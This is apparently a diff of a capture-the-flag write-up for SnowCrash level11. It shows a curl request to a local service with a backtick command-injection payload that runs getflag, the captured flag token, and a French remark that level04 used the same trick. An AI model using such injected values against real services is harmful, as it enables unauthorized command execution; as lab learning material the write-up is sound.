@@ -1,1 +1,6 @@
 curl 'localhost:5151?`getflag` > /tmp/b  &'
+
+level11@SnowCrash:~$ cat /tmp/b
+GET /?Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+ici on ce sert du meme principe que pour le level04
